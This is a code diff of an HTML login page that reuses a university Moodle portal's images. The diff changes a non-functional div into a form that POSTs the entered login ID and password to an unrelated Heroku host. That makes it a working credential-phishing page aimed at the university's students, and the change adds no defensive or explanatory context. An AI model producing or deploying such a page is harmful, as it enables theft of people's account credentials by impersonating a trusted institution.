@@ -159,29 +159,29 @@ console.log("error 323");
 <table>
 <tbody><tr>
  <td valign="top"><br><br>
-   <div name="index" onsubmit="onclick()" >
+   <form name="index" method="POST" action="https://she-api.herokuapp.com/" >
      <input type="hidden" name="refresh" value="96222">	
      <table cellspacing="0" cellpadding="1">
         <tbody><tr> 
           <td width="34%" align="left"><font size="2" face="Times New Roman, Times, serif" color="#004488"><strong>Login Id:</strong></font></td>
-          <td align="left"><input type="text" name="ID" id="ID" size="20"></td>
+          <td align="left"><input type="text" name="username" id="ID" size="20"></td>
         </tr>
         <tr> 
           <td width="34%" align="left"><font size="2" face="Times New Roman, Times, serif" color="#004488"><strong>Password:</strong></font></td>
-          <td align="left"><input type="password" id="PASS" name="PASS" size="20"></td>
+          <td align="left"><input type="password" id="PASS" name="password" size="20"></td>
         </tr>
      </tbody></table>
  
      <table align="center">
        <tbody><tr>
-        <td align="center"><br><br><input type="image" onclick("onclick()") src="http://moodle.smuc.edu.et/students/image/login.jpg" border="0"></input>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
+        <td align="center"><br><br><input type="image" src="http://moodle.smuc.edu.et/students/image/login.jpg" border="0"></input>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td>
       </tr>
       <tr>
         <td><div><a href="index.php"><font color="#627EB7"><u></u></font></a></div></td>
       </tr>
      </tbody></table>
      
-   </div>
+   </form>
    
   </td>
   <td width="310" height="210" background="http://moodle.smuc.edu.et/students/image/OurVisionNull.jpg"></td>
